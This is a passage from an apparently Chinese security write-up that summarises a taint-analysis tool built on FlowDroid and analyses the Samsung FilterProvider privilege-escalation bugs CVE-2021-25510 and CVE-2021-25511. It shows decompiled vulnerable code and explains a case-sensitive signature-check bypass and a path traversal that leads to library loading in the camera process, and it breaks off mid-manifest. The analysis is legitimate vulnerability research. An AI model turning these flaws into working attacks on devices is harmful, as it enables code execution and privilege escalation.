<ol>
<li>导出的<code>Activity</code>、<code>Service</code>、<code>Broadcast Receiver</code>或<code>Content Provider</code>中接收的<code>Intent</code>；</li>
<li>可控制的输入流中接收的数据，如<code>socket</code>；</li>
<li>可控制的位置处接收的文件，如攻击者包数据和全局可读&#x2F;写的位置。</li>
</ol>
<p><code>sink</code>的定义如下：</p>
<ol>
<li>文件输出流；</li>
<li>动态代码加载功能；</li>
<li>命令执行功能。</li>
</ol>
<p>剩下的就是去优化了，京东是使用了自己的分析工具，叫<code>Star Watcher</code>，基于<code>FlowDroid</code>。这个工具的特点是对上下文、流、字段和对象敏感，工作在过程间控制流图上，为了比其他工具好，在设计时考虑了以下几点：</p>
<ol>
<li>构建了一个完整的调用图：一个完整的调用图是所有后续分析的基础，如数据流和污点分析。目前最先进的<code>SPARK</code> <code>Java</code>指针分析，会漏掉某些分配节点，如：</li>
</ol>
<p><strong>例1</strong> </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Sample</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">target</span><span class="params">()</span> &#123;</span><br><span class="line">		<span class="keyword">for</span>(Helper helper: helpers)</span><br><span class="line">			helper.handle();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	Set&lt;Helper&gt; helpers;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">Sample</span> <span class="params">()</span> &#123;</span><br><span class="line">		<span class="built_in">this</span>.helpers = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">		<span class="built_in">this</span>.helpers.add(<span class="keyword">new</span> <span class="title class_">HelperImplA</span>());</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Helper</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handle</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HelperImplA</span> <span class="keyword">implements</span> <span class="title class_">Helper</span> &#123;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handle</span><span class="params">()</span> &#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;wtf&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HelperImplB</span> <span class="keyword">implements</span> <span class="title class_">Helper</span> &#123;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handle</span><span class="params">()</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>Spark</code>指针分析不能处理这种情况，即元素被放入容器，然后被取出，它不能在<code>handler.handle()</code>的调用位置决定<code>Helper</code>的类型。因此，<code>handler.handle</code>的调用边在调用图中缺失。如果<code>handle</code>函数中存在可能的数据流，就会导致遗漏。</p>
<p><strong>例2</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AParcelable</span> <span class="keyword">implements</span> <span class="title class_">Parcelable</span> &#123;</span><br><span class="line">	<span class="keyword">void</span> <span class="title function_">func</span><span class="params">()</span> &#123;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">Activity</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onResume</span><span class="params">()</span> &#123;</span><br><span class="line">		<span class="type">AParcelable</span> <span class="variable">p</span> <span class="operator">=</span> getIntent().getParcelableExtra(<span class="string">&quot;p&quot;</span>);</span><br><span class="line">		p.func();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对于例2，<code>AParcelable</code>类的分配是在解<code>parcelable</code>时在库的代码中完成的，这超出了分析范围。在这个例子中，<code>Spark</code>也未能正确地检测到这个变量的分配节点，从而导致调用图中目标类的调用边丢失。</p>
<p>为了解决这个问题，京东使用的办法是结合CHA算法，通过CHA算法，将可能丢失的边添加到调用图中，实验证明是有效的。</p>
<p>组件入口点改变也会影响到调用图的完整性，京东的解决方法是，在分析的过程中，建立一个假的<code>main</code>方法，调用所有组件的生命周期方法来模拟Android框架的行为。比如说，在API 29中增加了一个新的<code>Content Provider</code>的函数<code>call</code>的变体。</p>
<ol start="2">
<li><p>通过舍弃不相关的数据流优化执行性能，IFDS算法本质上是一种定点算法。它需要保留与每个语句相关的数据事实，以决定我们是否应该停止。IFDS算法的工作对象是过程间的CFG，并将流函数分为四种类型：</p>
</li>
<li><p>NormalFlowFuntions </p>
</li>
<li><p>CallFlowFunctions</p>
</li>
<li><p>ReturnFlowFunctions</p>
</li>
<li><p>CallToReturnFlowFunctions</p>
</li>
</ol>
<p>对于污点的实例，<code>CallFlow</code>负责决定是否将其传递给调用者函数，正常情况下，如果调用者函数是一个实例调用（<code>virtual</code>函数），IFDS将传递这个污点实例，并记录对应语句创建的&#x2F;缓存的边，因为污点隐式地与<code>this</code>实例相关。但是，如果实例字段从未被读或写，我们就不需要传递它。所以这一点是可以进行优化的。</p>
<p>通过对<code>icfg</code>进行快速的预检查和缓存实例分析，可以解决原来算法的OOM错误，并提高运行速度。</p>
<h1 id="3-厂商-bug"><a href="#3-厂商-bug" class="headerlink" title="3. 厂商 bug"></a>3. 厂商 bug</h1><h2 id="3-1-Camera-和-FilterProvider-中的权限提升"><a href="#3-1-Camera-和-FilterProvider-中的权限提升" class="headerlink" title="3.1 Camera 和 FilterProvider 中的权限提升"></a>3.1 Camera 和 FilterProvider 中的权限提升</h2><p>漏洞编号：CVE-2021-25510、CVE-2021-25511，并在2021年12月的三星安全公告中修复。</p>
<p>当一个具有<code>com.sec.android.camera.permission.USE_EFFECT_FILTER</code>权限当包被安装后，<code>FilterProvider</code>自动通过其注册的广播接收器收到通知，并将其识别为一个<code>CAMERA EFFECT FILTER</code>。目标包中的文件被提取到<code>/data/DownFilters/Lib64/</code>，函数如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.samsung.android.provider.filterprovider;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FilterInstaller</span> &#123;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">	<span class="keyword">private</span> String <span class="title function_">copyFileFromAssets</span><span class="params">(AssetManager arg10, String arg11, String arg12, <span class="type">boolean</span> arg13)</span> &#123;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">installLibFilter</span><span class="params">(Context arg11, String arg12)</span> &#123;</span><br><span class="line">		Resources v11_1;</span><br><span class="line">		Log.d(<span class="string">&quot;FilterInstaller&quot;</span>, <span class="string">&quot;install filter for Lib&quot;</span>);</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			v11_1 = arg11.getPackageManager().getResourcesForApplication(arg12);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">catch</span>(PackageManager.NameNotFoundException v11) &#123;</span><br><span class="line">			Log.e(<span class="string">&quot;FilterInstaller&quot;</span>, <span class="string">&quot;installLibFilter, resource error, package name : &quot;</span> + arg12 + <span class="string">&quot;, exception : &quot;</span> + v11.toString());</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="type">AssetManager</span> <span class="variable">v12</span> <span class="operator">=</span> v11_1.getAssets();</span><br><span class="line">		String[] v2 = <span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">0</span>];</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			v2 = v12.list(<span class="string">&quot;so&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">catch</span>(IOException v3) &#123;</span><br><span class="line">			Log.e(<span class="string">&quot;FilterInstaller&quot;</span>, <span class="string">&quot;installLibFilter, asset lib list exception : &quot;</span> + v3.toString());</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(v2.length &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">			Log.e(<span class="string">&quot;FilterInstaller&quot;</span>, <span class="string">&quot;asset lib list length is small than 0&quot;</span>);</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="type">int</span> <span class="variable">v3_1</span> <span class="operator">=</span> v2.length;</span><br><span class="line">		<span class="type">int</span> v4;</span><br><span class="line">		<span class="keyword">for</span>(v4 = <span class="number">0</span>; v4 &lt; v3_1; ++v4) &#123;</span><br><span class="line">			<span class="type">String</span> <span class="variable">v5</span> <span class="operator">=</span> v2[v4];</span><br><span class="line">			Log.d(<span class="string">&quot;FilterInstaller&quot;</span>, <span class="string">&quot;filterFile : &quot;</span> + v5);</span><br><span class="line">			<span class="keyword">if</span>(<span class="built_in">this</span>.storeLibFilters(v12, v11_1, v5, v5.split(<span class="string">&quot;\\.&quot;</span>)[<span class="number">0</span>]) == -<span class="number">1L</span> &amp;&amp; (v5.endsWith(<span class="string">&quot;.so&quot;</span>))) &#123;</span><br><span class="line">				Log.e(<span class="string">&quot;FilterInstaller&quot;</span>, <span class="string">&quot;storeLibFilters fail&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">this</span>.mServiceContext.getContentResolver().notifyChange(Constants.URI_NOTIFY_ADD, <span class="literal">null</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">	<span class="keyword">private</span> <span class="type">long</span> <span class="title function_">storeLibFilters</span><span class="params">(AssetManager arg18, Resources arg19, String arg20, String arg21)</span> &#123;</span><br><span class="line">		<span class="comment">//...</span></span><br><span class="line">		<span class="keyword">if</span>((arg20.endsWith(<span class="string">&quot;.so&quot;</span>)) &amp;&amp; !<span class="built_in">this</span>.checkSoSignature(v6)) &#123;</span><br><span class="line">			Log.e(<span class="string">&quot;FilterInstaller&quot;</span>, <span class="string">&quot;Signature check failed.&quot;</span>);</span><br><span class="line">			<span class="keyword">return</span> -<span class="number">1L</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(!arg20.endsWith(<span class="string">&quot;.sig&quot;</span>)) &#123;</span><br><span class="line">			<span class="type">ContentResolver</span> <span class="variable">v10</span> <span class="operator">=</span> <span class="built_in">this</span>.mServiceContext.getContentResolver();</span><br><span class="line">			<span class="type">ContentValues</span> <span class="variable">v11</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ContentValues</span>();</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			<span class="type">int</span> <span class="variable">v8_1</span> <span class="operator">=</span> arg19.getIdentifier(arg21 + <span class="string">&quot;_title&quot;</span>, <span class="string">&quot;string&quot;</span>, <span class="built_in">this</span>.mPackageName);</span><br><span class="line">			<span class="type">int</span> <span class="variable">v9_1</span> <span class="operator">=</span> arg19.getIdentifier(arg21 + <span class="string">&quot;_vendor&quot;</span>, <span class="string">&quot;string&quot;</span>, <span class="built_in">this</span>.mPackageName);</span><br><span class="line">			<span class="type">int</span> <span class="variable">v4</span> <span class="operator">=</span> arg19.getIdentifier(arg21 + <span class="string">&quot;_version&quot;</span>, <span class="string">&quot;string&quot;</span>, <span class="built_in">this</span>.mPackageName);</span><br><span class="line">			Log.e(<span class="string">&quot;FilterInstaller&quot;</span>, <span class="string">&quot;title = &quot;</span> + arg19.getString(v8_1) + <span class="string">&quot; vendor = &quot;</span> + arg19.getString(v9_1) + <span class="string">&quot;, version = &quot;</span> + arg19.getString(v4));</span><br><span class="line">			v11.put(<span class="string">&quot;name&quot;</span>, arg19.getString(v8_1));</span><br><span class="line">			v11.put(<span class="string">&quot;filename&quot;</span>, v6);</span><br><span class="line">			v11.put(<span class="string">&quot;version&quot;</span>, arg19.getString(v4));</span><br><span class="line">			v11.put(<span class="string">&quot;vendor&quot;</span>, arg19.getString(v9_1));</span><br><span class="line">			v11.put(<span class="string">&quot;package_name&quot;</span>, <span class="built_in">this</span>.mPackageName);</span><br><span class="line">			v11.put(<span class="string">&quot;title_id&quot;</span>, Integer.valueOf(v8_1));</span><br><span class="line">			v11.put(<span class="string">&quot;preload_filter&quot;</span>, Integer.valueOf(<span class="number">0</span>));</span><br><span class="line">			v11.put(<span class="string">&quot;filter_type&quot;</span>, <span class="string">&quot;SINGLE&quot;</span>);</span><br><span class="line">			v11.put(<span class="string">&quot;category&quot;</span>, Integer.valueOf(<span class="number">2</span>));</span><br><span class="line">			v11.put(<span class="string">&quot;vendor_package_name&quot;</span>, <span class="built_in">this</span>.mPackageName);</span><br><span class="line">			<span class="keyword">if</span>(v0_2 != <span class="literal">null</span>) &#123;</span><br><span class="line">				v11.put(<span class="string">&quot;texture&quot;</span>, v13);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//...</span></span><br></pre></td></tr></table></figure>

<p><code>tex</code>和<code>so</code>文件将被提取，但是，对于<code>so</code>文件，<code>FilterProvider</code>将对包有一些检查。一个<code>.sig</code>签名文件必须伴随着预先创建的RSA公钥并经过验证，否则，<code>Content Provider</code>将拒绝将其插入到<code>content://com.samsung.android.provider.filterprovider/filters</code>表中。开发者的目的应该是，这样的文件是由三星的私钥签名并通过公钥验证，这样该包就可以在相机应用商店分发。但是，这里有一个问题：**校验过程只针对<code>so</code>，而没有包含<code>SO</code>**。这样，当下一次相机应用程序被打开时，并点击相应的图标后，所有的过滤器将被预装到相机进程空间中，相应的代码在<code>libcamera_effect_processor_jni.so</code>中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_13A3A4</span><span class="params">(__int64 a1, <span class="type">char</span> *a2, <span class="type">char</span> *s1)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">	v28 = <span class="number">0LL</span>;</span><br><span class="line">	ptr[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">	<span class="keyword">if</span> ( <span class="built_in">strcmp</span>(s1, <span class="string">&quot;com.samsung.android.provider.filterprovider&quot;</span>) &amp;&amp; *(_DWORD *)(a1 + <span class="number">36</span>) != <span class="number">2</span> )</span><br><span class="line">	&#123;</span><br><span class="line">		asprintf(ptr, <span class="string">&quot;%s%s&quot;</span>, <span class="string">&quot;/data/DownFilters/Lib64/&quot;</span>, a2);</span><br><span class="line">		v7 = <span class="string">&quot;/data/DownFilters/Tex/&quot;</span>;</span><br><span class="line">		LABEL_11:</span><br><span class="line">		ptr[<span class="number">1</span>] = v7;</span><br><span class="line">		<span class="keyword">goto</span> LABEL_12;</span><br><span class="line">	&#125;</span><br><span class="line">	v5 = *(_QWORD *)(a1 + <span class="number">16</span>);</span><br><span class="line">	<span class="keyword">if</span> ( v5 )</span><br><span class="line">	&#123;</span><br><span class="line">		v6 = sub_57490(v5, a2);</span><br><span class="line">		<span class="keyword">if</span> ( v6 )</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> ( v6 != <span class="number">400</span> )</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> ( (sub_57748(*(_QWORD *)(a1 + <span class="number">16</span>), (<span class="type">int</span>)ptr, a2) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">					sub_575C4(*(_QWORD *)(a1 + <span class="number">16</span>), (<span class="type">int</span>)&amp;v28, a2);</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">					asprintf(ptr, <span class="string">&quot;%s%s&quot;</span>, <span class="string">&quot;/system/lib64/&quot;</span>, a2);</span><br><span class="line">					v7 = <span class="string">&quot;/system/cameradata/preloadfilters/Tex/&quot;</span>;</span><br><span class="line">					<span class="keyword">goto</span> LABEL_11;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	LABEL_12:</span><br><span class="line">	__android_log_print(<span class="number">3</span>, <span class="string">&quot;SECIMAGING&quot;</span>, <span class="string">&quot;Try to open external effect (%s)&quot;</span>, ptr[<span class="number">0</span>]);</span><br><span class="line">	*(_QWORD *)(a1 + <span class="number">56</span>) = dlopen(ptr[<span class="number">0</span>], <span class="number">2</span>);</span><br><span class="line">	<span class="built_in">free</span>(ptr[<span class="number">0</span>]);</span><br><span class="line">	v8 = *(<span class="type">void</span> **)(a1 + <span class="number">56</span>);</span><br><span class="line">	<span class="keyword">if</span> ( !v8 )</span><br><span class="line">	&#123;</span><br><span class="line">		v19 = dlerror();</span><br><span class="line">		__android_log_print(<span class="number">6</span>, <span class="string">&quot;SECIMAGING&quot;</span>, <span class="string">&quot;Filter %s dlopen failed&quot;</span>, v19);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	v9 = (__int64 (*)(<span class="type">void</span>))dlsym(v8, <span class="string">&quot;Create&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>赋予相机应用程序<code>WRITE_EFFECT_FILTER</code>权限以后，<code>FilterProvider</code>的服务<code>MyFilterService</code>将能够接收<code>Intent</code>，并将其写入到文件中：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.samsung.android.provider.filterprovider;</span><br><span class="line"><span class="keyword">void</span> <span class="title function_">install</span><span class="params">(Bundle arg15)</span> &#123;</span><br><span class="line">	Log.d(<span class="string">&quot;MyFilterInstaller&quot;</span>, <span class="string">&quot;install&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(arg15 == <span class="literal">null</span>) &#123;</span><br><span class="line">		Log.e(<span class="string">&quot;MyFilterInstaller&quot;</span>, <span class="string">&quot;install : bundle is null, return.&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">this</span>.createMyFilterDirectory();</span><br><span class="line">	<span class="type">String</span> <span class="variable">v2</span> <span class="operator">=</span> arg15.getString(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">	<span class="type">String</span> <span class="variable">v4</span> <span class="operator">=</span> arg15.getString(<span class="string">&quot;filename&quot;</span>);</span><br><span class="line">	<span class="type">byte</span>[] v6 = arg15.getByteArray(<span class="string">&quot;filter_thumbnail&quot;</span>);</span><br><span class="line">	<span class="type">String</span> <span class="variable">v7</span> <span class="operator">=</span> v2 + <span class="string">&quot;.bmp&quot;</span>;</span><br><span class="line">	<span class="type">String</span> <span class="variable">v8</span> <span class="operator">=</span> <span class="built_in">this</span>.copySelFileFromIntent(MyFilterInstaller.FILTER_STORAGE_MY_FILTER + <span class="string">&quot;/&quot;</span> + v4, arg15);</span><br><span class="line">	<span class="keyword">if</span>(v8 == <span class="literal">null</span>) &#123;</span><br><span class="line">		Log.e(<span class="string">&quot;MyFilterInstaller&quot;</span>, <span class="string">&quot;install : sel file copy failed = &quot;</span> + v4 + <span class="string">&quot; return.&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="comment">//.. /data/xxx/ + &quot;../../../../../&quot;</span></span><br><span class="line"><span class="keyword">private</span> String <span class="title function_">copySelFileFromIntent</span><span class="params">(String arg9, Bundle arg10)</span> &#123;</span><br><span class="line">	<span class="type">byte</span>[] v9_1;</span><br><span class="line">	FileOutputStream v10;</span><br><span class="line">	File v5;</span><br><span class="line">	<span class="type">int</span> <span class="variable">v4</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		v5 = <span class="keyword">new</span> <span class="title class_">File</span>(arg9);</span><br><span class="line">		<span class="keyword">goto</span> label_13;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">catch</span>(Exception unused_ex) &#123;</span><br><span class="line">		v10 = <span class="literal">null</span>;</span><br><span class="line">		v5 = <span class="literal">null</span>;</span><br><span class="line">		<span class="keyword">goto</span> label_43;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			label_13:</span><br><span class="line">			<span class="keyword">if</span>(v5.exists()) &#123;</span><br><span class="line">				v5.delete();</span><br><span class="line">				Log.w(<span class="string">&quot;MyFilterInstaller&quot;</span>, <span class="string">&quot;The named file already exists : &quot;</span> + arg9 + <span class="string">&quot;. So remove file.&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			v5.createNewFile();</span><br><span class="line">			v9_1 = arg10.getByteArray(<span class="string">&quot;filter_data&quot;</span>);</span><br><span class="line">			v10 = <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(v5);</span><br><span class="line">			<span class="keyword">goto</span> label_33;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">catch</span>(Exception unused_ex) &#123;</span><br><span class="line">			v10 = <span class="literal">null</span>;</span><br><span class="line">			<span class="keyword">goto</span> label_43;</span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">				label_33:</span><br><span class="line">				v10.write(v9_1);</span><br><span class="line">				<span class="keyword">if</span>(!v5.setExecutable(<span class="literal">true</span>, <span class="literal">false</span>)) &#123;</span><br><span class="line">					Log.e(<span class="string">&quot;MyFilterInstaller&quot;</span>, <span class="string">&quot;filter.setExecutable when copy from asset is not complete properly&quot;</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span>(!v5.setReadable(<span class="literal">true</span>, <span class="literal">false</span>)) &#123;</span><br><span class="line">					Log.e(<span class="string">&quot;MyFilterInstaller&quot;</span>, <span class="string">&quot;filter.setReadable when copy from asset is not complete properly&quot;</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">catch</span>(Exception unused_ex) &#123;</span><br><span class="line">				label_43:</span><br><span class="line">				Log.e(<span class="string">&quot;MyFilterInstaller&quot;</span>, <span class="string">&quot;copySelFileFromIntent : Exception is occurred.&quot;</span>);</span><br><span class="line">				<span class="keyword">if</span>(v10 != <span class="literal">null</span>) &#123;</span><br><span class="line">					<span class="keyword">try</span> &#123;</span><br><span class="line">						v10.close();</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">catch</span>(IOException unused_ex) &#123;</span><br><span class="line">						Log.e(<span class="string">&quot;MyFilterInstaller&quot;</span>, <span class="string">&quot;copySelFileFromIntent : Exception is occurred.&quot;</span>);</span><br><span class="line">					&#125;</span><br><span class="line">		<span class="comment">//...</span></span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			v10.close();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">catch</span>(IOException unused_ex) &#123;</span><br><span class="line">			Log.e(<span class="string">&quot;MyFilterInstaller&quot;</span>, <span class="string">&quot;copySelFileFromIntent : Exception is occurred.&quot;</span>);</span><br><span class="line">			<span class="keyword">goto</span> label_62;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

<p>这个服务被签名权限所保护：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">service</span> <span class="attr">android:enabled</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">android:name</span>=<span class="string">&quot;com.samsung.android.provider.filterprovider.MyFilterService&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">android:permission</span>=<span class="string">&quot;com.samsung.android.provider.filterprovider.permission.WRITE_FILTER&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;com.samsung.android.provider.filterprovider.INSERT_MYFILTER&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;com.samsung.android.provider.filterprovider.INSERT_MYFILTER_LIST&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span 